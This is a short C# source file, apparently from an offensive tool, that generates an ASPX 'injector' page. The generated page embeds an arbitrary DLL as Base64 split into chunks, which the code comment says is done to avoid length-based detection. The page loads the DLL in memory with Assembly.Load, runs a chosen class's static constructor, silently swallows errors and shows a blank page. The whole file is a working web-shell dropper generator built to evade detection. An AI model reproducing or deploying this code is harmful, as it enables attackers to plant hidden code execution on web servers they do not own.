namespace NMG.Formats;

/// <summary>
/// Generates a self-contained aspx injector page.
/// Embeds the DLL as Base64, loads it via Assembly.Load on first access,
/// then reflects into the registrar's static constructor.
/// </summary>
public static class AspxInjector
{
    public static string Wrap(byte[] dllBytes, string namespaceName, string className)
    {
        string b64 = Convert.ToBase64String(dllBytes);
        // Split Base64 into chunks to avoid single-line length detection
        var sb = new System.Text.StringBuilder();
        sb.AppendLine("<%@ Page Language=\"C#\" AutoEventWireup=\"true\" %>");
        sb.AppendLine("<%");
        sb.AppendLine("try");
        sb.AppendLine("{");
        sb.Append("    string b64 =");
        // Chunked base64 lines
        bool first = true;
        for (int i = 0; i < b64.Length; i += 76)
        {
            if (!first) sb.Append(" +");
            sb.AppendLine();
            sb.Append($"        \"{b64.Substring(i, Math.Min(76, b64.Length - i))}\"");
            first = false;
        }
        sb.AppendLine(";");
        sb.AppendLine("    byte[] data = System.Convert.FromBase64String(b64);");
        sb.AppendLine("    System.Reflection.Assembly asm = System.Reflection.Assembly.Load(data);");
        sb.AppendLine($"    System.Runtime.CompilerServices.RuntimeHelpers.RunClassConstructor(asm.GetType(\"{namespaceName}.{className}\").TypeHandle);");
        sb.AppendLine("    Response.Write(\"<!--ok-->\");");
        sb.AppendLine("}");
        sb.AppendLine("catch (Exception)");
        sb.AppendLine("{");
        sb.AppendLine("}");
        sb.AppendLine("%>");
        sb.AppendLine("<html><head><title></title></head><body></body></html>");
        return sb.ToString();
    }
}
